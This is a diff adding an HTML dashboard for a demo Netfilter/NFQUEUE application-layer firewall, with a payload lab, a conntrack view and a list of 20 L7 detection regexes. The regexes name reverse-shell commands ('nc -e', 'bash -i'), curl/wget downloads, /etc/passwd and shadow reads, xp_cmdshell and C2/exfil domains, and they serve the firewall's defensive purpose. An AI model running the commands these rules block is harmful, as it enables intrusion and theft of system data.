@@ -1,0 +1,779 @@
+<!DOCTYPE html>
+<html lang="en" class="light">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Stateful Firewall & L7 Filter</title>
+  <script src="https://www.gstatic.com/antigravity/web/dev/tailwindcss.min.js"></script>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap');
+    
+    :root {
+      --maroon-dark: #660018;
+      --maroon-primary: #800020;
+      --maroon-light: #9f1239;
+      --maroon-border: #f3d5dc;
+      --maroon-subtle: #fdf2f4;
+    }
+
+    body {
+      font-family: 'Plus Jakarta Sans', system-ui, -apple-system, sans-serif;
+      background-color: #faf7f8;
+      background-image: 
+        radial-gradient(at 10% 10%, rgba(128, 0, 32, 0.05) 0px, transparent 40%),
+        radial-gradient(at 90% 90%, rgba(128, 0, 32, 0.03) 0px, transparent 40%),
+        linear-gradient(to right, rgba(128, 0, 32, 0.02) 1px, transparent 1px),
+        linear-gradient(to bottom, rgba(128, 0, 32, 0.02) 1px, transparent 1px);
+      background-size: 100% 100%, 100% 100%, 28px 28px, 28px 28px;
+    }
+
+    .font-mono { font-family: 'JetBrains Mono', monospace; }
+
+    /* Custom scrollbars in maroon/white */
+    ::-webkit-scrollbar { width: 6px; height: 6px; }
+    ::-webkit-scrollbar-track { background: transparent; }
+    ::-webkit-scrollbar-thumb { background: rgba(128, 0, 32, 0.2); border-radius: 4px; }
+    ::-webkit-scrollbar-thumb:hover { background: rgba(128, 0, 32, 0.4); }
+
+    .glow-maroon {
+      box-shadow: 0 10px 25px -5px rgba(128, 0, 32, 0.2), 0 8px 10px -6px rgba(128, 0, 32, 0.12);
+    }
+    .glow-soft {
+      box-shadow: 0 4px 14px -2px rgba(128, 0, 32, 0.08);
+    }
+
+    .pulse-scan {
+      animation: scan-pulse 0.35s ease-out;
+    }
+    @keyframes scan-pulse {
+      0% { transform: scale(0.99); opacity: 0.9; }
+      50% { transform: scale(1.01); opacity: 1; }
+      100% { transform: scale(1); }
+    }
+  </style>
+</head>
+<body class="text-stone-900 antialiased min-h-screen p-4 md:p-8 flex flex-col justify-between selection:bg-[#800020] selection:text-white">
+
+  <div class="max-w-7xl w-full mx-auto space-y-6">
+
+    <!-- Top Header Bar (No Logo - Pure Maroon & White Typography) -->
+    <header class="bg-white border border-[#edd7dd] rounded-3xl p-6 shadow-sm flex flex-col md:flex-row justify-between items-start md:items-center gap-4 relative overflow-hidden">
+      <div>
+        <div class="flex items-center gap-2.5">
+          <span class="w-2.5 h-2.5 rounded-full bg-[#800020] animate-pulse"></span>
+          <span class="text-xs font-mono uppercase tracking-wider px-2.5 py-0.5 rounded-full bg-[#fdf2f4] text-[#800020] border border-[#f3d5dc] font-bold">
+            NFQUEUE #0 ACTIVE &bull; KERNEL ONLINE
+          </span>
+        </div>
+        <h1 class="text-2xl font-extrabold tracking-tight text-[#800020] mt-1.5">
+          Stateful Application-Layer Firewall & Intrusion Filter
+        </h1>
+        <p class="text-xs text-stone-500 mt-0.5">
+          Author: <strong class="text-stone-800">Ayush Behera</strong> &bull; Linux Kernel Netfilter (libnetfilter_queue) &bull; C++17 Stateful Engine
+        </p>
+      </div>
+
+      <!-- Quick Action Badges -->
+      <div class="flex items-center gap-2.5 flex-wrap">
+        <div class="bg-[#fdf2f4] border border-[#f3d5dc] rounded-2xl px-3.5 py-1.5 flex items-center gap-2 font-mono text-xs text-[#800020]">
+          <span class="text-stone-500">GC Interval:</span>
+          <span class="font-bold text-[#800020]">5.0s</span>
+        </div>
+        <div class="bg-[#fdf2f4] border border-[#f3d5dc] rounded-2xl px-3.5 py-1.5 flex items-center gap-2 font-mono text-xs text-[#800020]">
+          <span class="text-stone-500">L7 Rules:</span>
+          <span class="font-bold text-[#800020]">20 Active</span>
+        </div>
+        <button onclick="triggerQuickAttack()" class="px-4 py-2 text-xs font-bold rounded-2xl bg-[#800020] hover:bg-[#660018] text-white shadow-sm transition flex items-center gap-1.5 border border-[#800020]">
+          <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
+          Quick Attack Test
+        </button>
+      </div>
+    </header>
+
+    <!-- Visual Packet Journey Pipeline (Maroon & White) -->
+    <div class="bg-white border border-[#edd7dd] rounded-3xl p-5 shadow-sm space-y-3">
+      <div class="flex items-center justify-between">
+        <div class="flex items-center gap-2">
+          <span class="text-xs font-bold uppercase tracking-wider text-[#800020] font-mono">&bull; Packet Journey Pipeline</span>
+          <span class="text-xs text-stone-500">(Ingress &rarr; NFQUEUE &rarr; Conntrack L4 &rarr; L7 DPI &rarr; Verdict)</span>
+        </div>
+        <span class="text-xs font-mono text-[#800020] font-semibold flex items-center gap-1.5">
+          <span class="w-2 h-2 rounded-full bg-[#800020]"></span>
+          Line Rate Filtering
+        </span>
+      </div>
+
+      <div class="grid grid-cols-2 sm:grid-cols-5 gap-3">
+        <!-- 1: NIC -->
+        <div class="bg-[#fdf2f4] border border-[#f3d5dc] rounded-2xl p-3.5 text-center">
+          <div class="text-[10px] font-mono text-[#800020] uppercase font-bold">1. NIC Ingress</div>
+          <div class="font-bold text-sm text-stone-900 mt-1">eth0 / lo</div>
+          <div class="text-[11px] text-stone-500 font-mono mt-0.5">Raw IP Packet</div>
+        </div>
+        <!-- 2: Netfilter -->
+        <div class="bg-[#fdf2f4] border border-[#f3d5dc] rounded-2xl p-3.5 text-center">
+          <div class="text-[10px] font-mono text-[#800020] uppercase font-bold">2. Netfilter Hook</div>
+          <div class="font-bold text-sm text-[#800020] mt-1">NFQUEUE #0</div>
+          <div class="text-[11px] text-stone-500 font-mono mt-0.5">Netlink Socket Copy</div>
+        </div>
+        <!-- 3: Conntrack L4 -->
+        <div class="bg-[#fdf2f4] border border-[#f3d5dc] rounded-2xl p-3.5 text-center">
+          <div class="text-[10px] font-mono text-[#800020] uppercase font-bold">3. Conntrack L4</div>
+          <div class="font-bold text-sm text-stone-900 mt-1">RFC 793 State</div>
+          <div class="text-[11px] text-stone-500 font-mono mt-0.5">shared_mutex Table</div>
+        </div>
+        <!-- 4: DPI -->
+        <div class="bg-[#fdf2f4] border border-[#f3d5dc] rounded-2xl p-3.5 text-center">
+          <div class="text-[10px] font-mono text-[#800020] uppercase font-bold">4. L7 DPI Engine</div>
+          <div class="font-bold text-sm text-[#800020] mt-1">HTTP / DNS Parser</div>
+          <div class="text-[11px] text-stone-500 font-mono mt-0.5">20 Rules & Entropy</div>
+        </div>
+        <!-- 5: Verdict -->
+        <div id="pipe-box" class="col-span-2 sm:col-span-1 bg-white border-2 border-[#800020] rounded-2xl p-3.5 text-center transition shadow-xs">
+          <div class="text-[10px] font-mono text-[#800020] uppercase font-bold">5. Kernel Verdict</div>
+          <div id="pipe-text" class="font-extrabold text-sm text-[#800020] mt-1">NF_ACCEPT</div>
+          <div class="text-[11px] text-stone-500 font-mono mt-0.5">nfq_set_verdict()</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Live Telemetry KPI Cards -->
+    <div class="grid grid-cols-2 lg:grid-cols-4 gap-4">
+      <div class="bg-white border border-[#edd7dd] rounded-3xl p-5 shadow-sm">
+        <div class="text-xs font-mono uppercase text-stone-500 font-semibold">Total Inspected Packets</div>
+        <div id="kpi-total" class="text-3xl font-extrabold text-stone-900 mt-2 font-mono">1,248</div>
+        <div class="text-xs text-[#800020] font-medium mt-1 font-mono">&uarr; 100% processed at line rate</div>
+      </div>
+
+      <div class="bg-white border border-[#edd7dd] rounded-3xl p-5 shadow-sm">
+        <div class="text-xs font-mono uppercase text-stone-500 font-semibold">Active Conntrack Flows</div>
+        <div id="kpi-conntrack" class="text-3xl font-extrabold text-[#800020] mt-2 font-mono">14</div>
+        <div class="text-xs text-stone-500 font-mono mt-1">Table capacity: 100,000</div>
+      </div>
+
+      <div class="bg-white border border-[#edd7dd] rounded-3xl p-5 shadow-sm">
+        <div class="text-xs font-mono uppercase text-stone-500 font-semibold">Threats Dropped (NF_DROP)</div>
+        <div id="kpi-dropped" class="text-3xl font-extrabold text-[#800020] mt-2 font-mono">37</div>
+        <div class="text-xs text-[#800020] font-medium mt-1 font-mono">SQLi, XSS, RCE, Traversal</div>
+      </div>
+
+      <div class="bg-white border border-[#edd7dd] rounded-3xl p-5 shadow-sm">
+        <div class="text-xs font-mono uppercase text-stone-500 font-semibold">Clean Packets Passed</div>
+        <div id="kpi-accepted" class="text-3xl font-extrabold text-stone-800 mt-2 font-mono">1,211</div>
+        <div class="text-xs text-stone-500 font-mono mt-1">Legitimate L4/L7 packets</div>
+      </div>
+    </div>
+
+    <!-- Navigation Tabs -->
+    <div class="border-b border-[#edd7dd] flex gap-6 text-sm font-semibold">
+      <button onclick="showTab('lab')" id="tab-lab" class="pb-3 border-b-2 border-[#800020] text-[#800020] font-bold flex items-center gap-2">
+        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19.428 15.428a2 2 0 00-1.022-.547l-2.387-.477a6 6 0 00-3.86.517l-.318.158a6 6 0 01-3.86.517L6.05 15.21a2 2 0 00-1.806.547M8 4h8l-1 1v5.172a2 2 0 00.586 1.414l5 5c1.26 1.26.367 3.414-1.415 3.414H4.828c-1.782 0-2.674-2.154-1.414-3.414l5-5A2 2 0 009 10.172V5L8 4z"/></svg>
+        DPI Payload Laboratory
+      </button>
+      <button onclick="showTab('conntrack')" id="tab-conntrack" class="pb-3 border-b-2 border-transparent text-stone-500 hover:text-[#800020] flex items-center gap-2">
+        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 10h16M4 14h16M4 18h16"/></svg>
+        Conntrack Table (L4)
+      </button>
+      <button onclick="showTab('rules')" id="tab-rules" class="pb-3 border-b-2 border-transparent text-stone-500 hover:text-[#800020] flex items-center gap-2">
+        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/></svg>
+        L7 Signature Rules (20)
+      </button>
+      <button onclick="showTab('logs')" id="tab-logs" class="pb-3 border-b-2 border-transparent text-stone-500 hover:text-[#800020] flex items-center gap-2">
+        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"/></svg>
+        Kernel Log Stream
+      </button>
+    </div>
+
+    <!-- VIEW 1: DPI PAYLOAD LABORATORY -->
+    <div id="section-lab" class="space-y-6">
+      <div class="grid grid-cols-1 lg:grid-cols-12 gap-6">
+
+        <!-- Left Column: Payload Editor & Controls -->
+        <div class="lg:col-span-7 bg-white border border-[#edd7dd] rounded-3xl p-6 shadow-sm space-y-4">
+          <div class="flex items-center justify-between">
+            <h2 class="text-base font-bold text-stone-900 flex items-center gap-2">
+              <span class="w-2.5 h-2.5 rounded-full bg-[#800020]"></span>
+              Payload & Flow Composer
+            </h2>
+            <span class="text-xs font-mono text-stone-500 font-medium">ECMAScript Regex & L7 DPI</span>
+          </div>
+
+          <!-- Attack Preset Chips in Maroon/White -->
+          <div>
+            <div class="text-xs font-semibold text-stone-700 mb-2">Select Attack Vector Preset:</div>
+            <div class="flex flex-wrap gap-2">
+              <button onclick="selectPreset('clean')" class="btn-preset px-3 py-1.5 rounded-xl bg-white hover:bg-[#fdf2f4] text-xs font-semibold text-stone-800 border border-[#edd7dd] hover:border-[#800020] transition">
+                &bull; Benign Web
+              </button>
+              <button onclick="selectPreset('sqli_union')" class="btn-preset px-3 py-1.5 rounded-xl bg-white hover:bg-[#fdf2f4] text-xs font-semibold text-[#800020] border border-[#edd7dd] hover:border-[#800020] transition">
+                &bull; SQLi UNION
+              </button>
+              <button onclick="selectPreset('sqli_bool')" class="btn-preset px-3 py-1.5 rounded-xl bg-white hover:bg-[#fdf2f4] text-xs font-semibold text-[#800020] border border-[#edd7dd] hover:border-[#800020] transition">
+                &bull; SQLi ' OR 1=1
+              </button>
+              <button onclick="selectPreset('xss_script')" class="btn-preset px-3 py-1.5 rounded-xl bg-white hover:bg-[#fdf2f4] text-xs font-semibold text-[#800020] border border-[#edd7dd] hover:border-[#800020] transition">
+                &bull; XSS &lt;script&gt;
+              </button>
+              <button onclick="selectPreset('xss_img')" class="btn-preset px-3 py-1.5 rounded-xl bg-white hover:bg-[#fdf2f4] text-xs font-semibold text-[#800020] border border-[#edd7dd] hover:border-[#800020] transition">
+                &bull; XSS onerror
+              </button>
+              <button onclick="selectPreset('traversal')" class="btn-preset px-3 py-1.5 rounded-xl bg-white hover:bg-[#fdf2f4] text-xs font-semibold text-[#800020] border border-[#edd7dd] hover:border-[#800020] transition">
+                &bull; /etc/passwd
+              </button>
+              <button onclick="selectPreset('rce')" class="btn-preset px-3 py-1.5 rounded-xl bg-white hover:bg-[#fdf2f4] text-xs font-semibold text-[#800020] border border-[#edd7dd] hover:border-[#800020] transition">
+                &bull; RCE Shell
+              </button>
+              <button onclick="selectPreset('scanner')" class="btn-preset px-3 py-1.5 rounded-xl bg-white hover:bg-[#fdf2f4] text-xs font-semibold text-[#800020] border border-[#edd7dd] hover:border-[#800020] transition">
+                &bull; sqlmap Bot
+              </button>
+              <button onclick="selectPreset('dns_tunnel')" class="btn-preset px-3 py-1.5 rounded-xl bg-white hover:bg-[#fdf2f4] text-xs font-semibold text-[#800020] border border-[#edd7dd] hover:border-[#800020] transition">
+                &bull; DNS Tunnel
+              </button>
+            </div>
+          </div>
+
+          <!-- Flow 5-Tuple Inputs -->
+          <div class="grid grid-cols-2 sm:grid-cols-4 gap-2.5 font-mono text-xs">
+            <div class="bg-[#faf7f8] border border-[#edd7dd] rounded-xl p-2">
+              <span class="text-stone-500 text-[10px] font-semibold">SRC IP:</span>
+              <input id="in-src-ip" type="text" value="192.168.1.142" class="w-full bg-transparent text-stone-900 font-bold focus:outline-none">
+            </div>
+            <div class="bg-[#faf7f8] border border-[#edd7dd] rounded-xl p-2">
+              <span class="text-stone-500 text-[10px] font-semibold">SRC PORT:</span>
+              <input id="in-src-port" type="number" value="48292" class="w-full bg-transparent text-stone-900 font-bold focus:outline-none">
+            </div>
+            <div class="bg-[#faf7f8] border border-[#edd7dd] rounded-xl p-2">
+              <span class="text-stone-500 text-[10px] font-semibold">DST IP:</span>
+              <input id="in-dst-ip" type="text" value="10.0.0.1" class="w-full bg-transparent text-stone-900 font-bold focus:outline-none">
+            </div>
+            <div class="bg-[#faf7f8] border border-[#edd7dd] rounded-xl p-2">
+              <span class="text-stone-500 text-[10px] font-semibold">DST PORT:</span>
+              <input id="in-dst-port" type="number" value="80" class="w-full bg-transparent text-stone-900 font-bold focus:outline-none">
+            </div>
+          </div>
+
+          <!-- Raw Payload Textarea -->
+          <div class="space-y-1.5">
+            <div class="flex justify-between items-center text-xs">
+              <span class="text-stone-600 font-semibold font-mono">Application Layer Payload (HTTP / DNS):</span>
+              <span id="char-count" class="font-mono text-stone-500">142 bytes</span>
+            </div>
+            <textarea id="payload-box" rows="8" class="w-full bg-[#faf7f8] border border-[#edd7dd] rounded-2xl p-4 font-mono text-xs text-stone-900 focus:outline-none focus:border-[#800020] focus:ring-2 focus:ring-[#800020]/20 transition leading-relaxed resize-none shadow-inner" oninput="updateByteCount()" placeholder="Paste HTTP request or custom payload here...">GET /index.html HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)
+Accept: text/html,application/xhtml+xml</textarea>
+            <div class="text-[11px] text-stone-500 flex justify-between">
+              <span>Press <kbd class="px-1.5 py-0.5 bg-white border border-[#edd7dd] rounded font-mono font-bold text-[#800020]">Cmd+Enter</kbd> or <kbd class="px-1.5 py-0.5 bg-white border border-[#edd7dd] rounded font-mono font-bold text-[#800020]">Ctrl+Enter</kbd> to inspect</span>
+            </div>
+          </div>
+
+          <!-- Execute Button (Maroon Primary) -->
+          <button id="btn-run-inspection" onclick="executeInspection(true)" class="w-full py-3.5 rounded-2xl bg-[#800020] hover:bg-[#660018] active:scale-[0.99] text-white font-bold text-sm shadow-md transition flex items-center justify-center gap-2 cursor-pointer border border-[#800020]">
+            <svg id="btn-spinner" class="hidden animate-spin w-4 h-4 text-white" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8H4z"></path></svg>
+            <svg id="btn-icon" class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M14 5l7 7m0 0l-7 7m7-7H3"/></svg>
+            <span id="btn-label">Run Deep Packet Inspection & Issue Verdict</span>
+          </button>
+        </div>
+
+        <!-- Right Column: Netfilter Verdict Card in Maroon & White -->
+        <div class="lg:col-span-5 space-y-4 flex flex-col justify-between">
+          <div class="bg-white border border-[#edd7dd] rounded-3xl p-6 shadow-sm space-y-4">
+            <h2 class="text-base font-bold text-[#800020] flex items-center gap-2">
+              <span class="w-2.5 h-2.5 rounded-full bg-[#800020]"></span>
+              Netfilter Decision & Analysis
+            </h2>
+
+            <!-- Verdict Card -->
+            <div id="card-verdict" class="rounded-2xl p-4 border transition-all duration-300 bg-white border-2 border-stone-300 text-stone-900 glow-soft flex items-center justify-between">
+              <div>
+                <div id="title-verdict" class="font-extrabold text-base tracking-wide font-mono text-stone-900">VERDICT: NF_ACCEPT</div>
+                <div id="desc-verdict" class="text-xs text-stone-500 mt-0.5">Packet cleared all signature checks & stateful rules</div>
+              </div>
+              <div class="text-right">
+                <span id="badge-verdict" class="text-[10px] font-bold px-2.5 py-1 rounded-full bg-stone-100 text-stone-800 border border-stone-300 uppercase tracking-wider font-mono">CLEAN</span>
+              </div>
+            </div>
+
+            <!-- Dissection Metadata Table -->
+            <div class="bg-[#faf7f8] border border-[#edd7dd] rounded-2xl p-4 space-y-2.5 text-xs font-mono">
+              <div class="text-[11px] font-bold text-[#800020] border-b border-[#edd7dd] pb-1.5 flex justify-between">
+                <span>INSPECTION BREAKDOWN</span>
+                <span id="label-latency" class="text-[#800020] font-bold">24 &micro;s latency</span>
+              </div>
+              <div class="flex justify-between">
+                <span class="text-stone-500">Directional Flow:</span>
+                <span id="info-flow" class="text-stone-900 font-bold">192.168.1.142:48292 &rarr; 10.0.0.1:80</span>
+              </div>
+              <div class="flex justify-between">
+                <span class="text-stone-500">Conntrack State:</span>
+                <span id="info-state" class="text-[#800020] font-bold">ESTABLISHED</span>
+              </div>
+              <div class="flex justify-between">
+                <span class="text-stone-500">Threat Classification:</span>
+                <span id="info-category" class="text-stone-800 font-bold">NONE (BENIGN)</span>
+              </div>
+              <div class="flex justify-between">
+                <span class="text-stone-500">Matched Rule ID:</span>
+                <span id="info-rule-id" class="text-stone-600 font-semibold">-</span>
+              </div>
+              <div class="flex justify-between">
+                <span class="text-stone-500">Kernel Action:</span>
+                <span id="info-action" class="text-stone-800 font-bold">NF_ACCEPT (Transmit)</span>
+              </div>
+            </div>
+
+            <!-- Threat Token Highlight Box (Maroon Alert) -->
+            <div id="threat-highlight-box" class="hidden bg-[#fdf2f4] border-2 border-[#800020] rounded-2xl p-4 space-y-2 text-[#800020] glow-maroon">
+              <div class="flex items-center justify-between text-xs font-bold">
+                <span class="flex items-center gap-1.5 text-[#800020]">
+                  <svg class="w-4 h-4 text-[#800020]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/></svg>
+                  Intrusion Signature Matched
+                </span>
+                <span class="text-[10px] font-mono px-2 py-0.5 rounded bg-[#800020] text-white font-bold">DROPPED</span>
+              </div>
+              <div id="threat-snippet" class="p-2.5 rounded-xl bg-white border border-[#f3d5dc] font-mono text-xs text-[#800020] font-bold break-all select-all"></div>
+              <div id="threat-desc" class="text-[11px] text-stone-600 italic"></div>
+            </div>
+          </div>
+
+          <!-- Bottom Notice -->
+          <div class="bg-white border border-[#edd7dd] rounded-2xl p-3 text-[11px] text-stone-500 text-center font-mono">
+            Linux Kernel <code>NF_DROP</code> discards malicious frames immediately at the Netlink boundary.
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- VIEW 2: CONNTRACK TABLE (L4) -->
+    <div id="section-conntrack" class="hidden space-y-4">
+      <div class="bg-white border border-[#edd7dd] rounded-3xl p-6 shadow-sm space-y-4">
+        <div class="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-2">
+          <div>
+            <h2 class="text-base font-bold text-stone-900">Active Connection Tracking Table (L4)</h2>
+            <p class="text-xs text-stone-500">Thread-safe bidirectional lookup table protected by <code>std::shared_mutex</code></p>
+          </div>
+          <button onclick="simulateNewFlow()" class="px-3.5 py-1.5 rounded-xl bg-[#800020] hover:bg-[#660018] text-xs font-bold text-white transition flex items-center gap-1.5 shadow-sm">
+            <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 4v16m8-8H4"/></svg>
+            Simulate 3-Way Handshake
+          </button>
+        </div>
+
+        <div class="overflow-x-auto">
+          <table class="w-full text-left text-xs font-mono">
+            <thead class="bg-[#faf7f8] text-stone-700 uppercase text-[10px] tracking-wider border-y border-[#edd7dd] font-bold">
+              <tr>
+                <th class="py-3 px-4">Flow 5-Tuple (Src &rarr; Dst)</th>
+                <th class="py-3 px-4">Protocol</th>
+                <th class="py-3 px-4">TCP State</th>
+                <th class="py-3 px-4">Packets (Fwd/Rev)</th>
+                <th class="py-3 px-4">Volume</th>
+                <th class="py-3 px-4">Idle Timeout</th>
+                <th class="py-3 px-4 text-right">Actions</th>
+              </tr>
+            </thead>
+            <tbody id="conntrack-tbody" class="divide-y divide-[#faf7f8]">
+              <!-- Populated by JS -->
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+
+    <!-- VIEW 3: SIGNATURE RULES -->
+    <div id="section-rules" class="hidden space-y-4">
+      <div class="bg-white border border-[#edd7dd] rounded-3xl p-6 shadow-sm space-y-4">
+        <div class="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-3">
+          <div>
+            <h2 class="text-base font-bold text-stone-900">Active Layer 7 Signature Rules (20 Rules)</h2>
+            <p class="text-xs text-stone-500">Loaded from <code>rules/default_rules.conf</code> &bull; Real-time ECMAScript pattern evaluation</p>
+          </div>
+          <input id="rule-search-box" oninput="filterSignatures()" type="text" placeholder="Search rules (SQLI, XSS, RCE)..." class="bg-[#faf7f8] border border-[#edd7dd] rounded-xl px-3.5 py-1.5 text-xs text-stone-800 focus:outline-none focus:border-[#800020] w-full sm:w-64">
+        </div>
+
+        <div class="overflow-x-auto">
+          <table class="w-full text-left text-xs font-mono">
+            <thead class="bg-[#faf7f8] text-stone-700 uppercase text-[10px] tracking-wider border-y border-[#edd7dd] font-bold">
+              <tr>
+                <th class="py-3 px-4">Rule ID</th>
+                <th class="py-3 px-4">Target Field</th>
+                <th class="py-3 px-4">Action</th>
+                <th class="py-3 px-4">Category</th>
+                <th class="py-3 px-4">Signature Pattern</th>
+                <th class="py-3 px-4">Description</th>
+              </tr>
+            </thead>
+            <tbody id="rules-tbody" class="divide-y divide-[#faf7f8] text-[11px]">
+              <!-- Populated by JS -->
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+
+    <!-- VIEW 4: AUDIT LOGS -->
+    <div id="section-logs" class="hidden space-y-4">
+      <div class="bg-white border border-[#edd7dd] rounded-3xl p-6 shadow-sm space-y-3">
+        <div class="flex justify-between items-center">
+          <div>
+            <h2 class="text-base font-bold text-stone-900 flex items-center gap-2">
+              <span class="w-2 h-2 rounded-full bg-[#800020]"></span>
+              Live Kernel Daemon Audit Log
+            </h2>
+            <p class="text-xs text-stone-500">Microsecond timestamps &bull; Asynchronous worker thread &bull; <code>firewall.log</code></p>
+          </div>
+          <button onclick="clearLogStream()" class="px-3 py-1 rounded-xl bg-white hover:bg-stone-50 text-xs font-mono border border-[#edd7dd] text-stone-700">Clear</button>
+        </div>
+
+        <div id="audit-log-stream" class="bg-[#1c1917] text-stone-200 font-mono text-xs p-4 rounded-2xl h-96 overflow-y-auto space-y-1.5 select-text shadow-inner">
+          <!-- Populated by JS -->
+        </div>
+      </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="text-center text-xs text-stone-500 font-mono border-t border-[#edd7dd] pt-4 pb-2">
+      Stateful Application-Layer Firewall & Intrusion Filter &bull; Developed by <span class="font-bold text-[#800020]">Ayush Behera</span> &bull; Linux Netfilter Queue Architecture
+    </footer>
+
+  </div>
+
+  <script>
+    // Rules from rules/default_rules.conf
+    const RULES = [
+      { id: "SQLI-101", target: "URI", action: "DROP", cat: "SQLI", regex: "(union(\\s+all)?\\s+select)", desc: "Classic UNION-based SQL injection in URI parameter" },
+      { id: "SQLI-102", target: "BODY", action: "DROP", cat: "SQLI", regex: "(union(\\s+all)?\\s+select)", desc: "Classic UNION-based SQL injection in request body" },
+      { id: "SQLI-103", target: "ANY", action: "DROP", cat: "SQLI", regex: "('(\\s*or\\s*|\\s*and\\s*)[^\\r\\n]+[=<>])", desc: "Boolean-based tautology injection (' OR '1'='1)" },
+      { id: "SQLI-104", target: "ANY", action: "DROP", cat: "SQLI", regex: "(sleep\\s*\\(\\s*\\d+\\s*\\)|benchmark\\s*\\(\\s*\\d+|waitfor\\s+delay|pg_sleep)", desc: "Time-based blind SQL injection probe" },
+      { id: "SQLI-105", target: "ANY", action: "DROP", cat: "SQLI", regex: "(information_schema\\.(tables|columns|schemata)|sys\\.(databases|tables))", desc: "Database catalog enumeration attempt" },
+      { id: "SQLI-106", target: "ANY", action: "DROP", cat: "SQLI", regex: "(drop\\s+table|alter\\s+table|delete\\s+from|insert\\s+into\\s+[a-z_]+\\s+values)", desc: "Destructive DDL/DML injection vector" },
+      { id: "SQLI-107", target: "ANY", action: "DROP", cat: "SQLI", regex: "(;\\s*exec\\s*\\(|xp_cmdshell|exec\\s+sp_configure)", desc: "Stacked MSSQL command shell execution" },
+      { id: "XSS-101", target: "ANY", action: "DROP", cat: "XSS", regex: "(<\\s*script[^>]*>|javascript\\s*:|vbscript\\s*:)", desc: "Inline script execution vector" },
+      { id: "XSS-102", target: "ANY", action: "DROP", cat: "XSS", regex: "(on(load|error|click|mouseover|focus|blur|submit)\\s*=)", desc: "Inline DOM event handler injection" },
+      { id: "XSS-103", target: "ANY", action: "DROP", cat: "XSS", regex: "(<\\s*(img|svg|iframe|body|input|audio|video)[^>]+(onerror|onload)\\s*=)", desc: "HTML5 tag payload execution vector" },
+      { id: "XSS-104", target: "ANY", action: "DROP", cat: "XSS", regex: "(document\\.(cookie|location|write)|window\\.location)", desc: "Client session token or DOM tampering attempt" },
+      { id: "XSS-105", target: "ANY", action: "DROP", cat: "XSS", regex: "(alert\\s*\\(|confirm\\s*\\(|prompt\\s*\\(|eval\\s*\\()", desc: "Dynamic JavaScript execution primitives" },
+      { id: "TRAV-101", target: "URI", action: "DROP", cat: "TRAVERSAL", regex: "(\\.\\./|\\.\\.\\\\|%2e%2e%2f|%2e%2e\\/|\\.\\.%2f)", desc: "Directory traversal sequence in URI" },
+      { id: "TRAV-102", target: "ANY", action: "DROP", cat: "TRAVERSAL", regex: "(/etc/(passwd|shadow|hosts|issue|sudoers)|boot\\.ini|winnt/system32)", desc: "Sensitive system configuration file access" },
+      { id: "RCE-101", target: "ANY", action: "DROP", cat: "RCE", regex: "(\\|\\||;|&|`|\\$\\()\\s*(cat\\s+/etc/passwd|id\\b|whoami\\b|uname\\s+-a|nc\\s+-e|bash\\s+-i|curl\\s+http|wget\\s+http)", desc: "Remote shell command chaining" },
+      { id: "RCE-102", target: "ANY", action: "DROP", cat: "RCE", regex: "(php://(input|filter)|data://text/plain)", desc: "Malicious PHP stream wrapper injection" },
+      { id: "SCAN-101", target: "HEADER", action: "DROP", cat: "MALICIOUS_UA", regex: "(sqlmap|nikto|w3af|dirbuster|acunetix|masscan|zgrab|nmap\\s+scripting)", desc: "Automated vulnerability scanner User-Agent" },
+      { id: "SCAN-102", target: "HEADER", action: "ALERT", cat: "SCANNER", regex: "(curl/|python-requests/|Go-http-client/|Wget/)", desc: "Generic scripted HTTP client detection" },
+      { id: "DNS-101", target: "DNS", action: "DROP", cat: "DNS", regex: "\\.(onion|local|test|invalid)$", desc: "Queries for unresolvable or darknet top-level domains" },
+      { id: "DNS-102", target: "DNS", action: "ALERT", cat: "DNS", regex: "(c2\\.|botnet\\.|exfil\\.|malware\\.)", desc: "Suspicious C2 command-and-control domain prefixes" }
+    ];
+
+    const PRESETS = {
+      clean: `GET /index.html HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)\r\nAccept: text/html,application/xhtml+xml`,
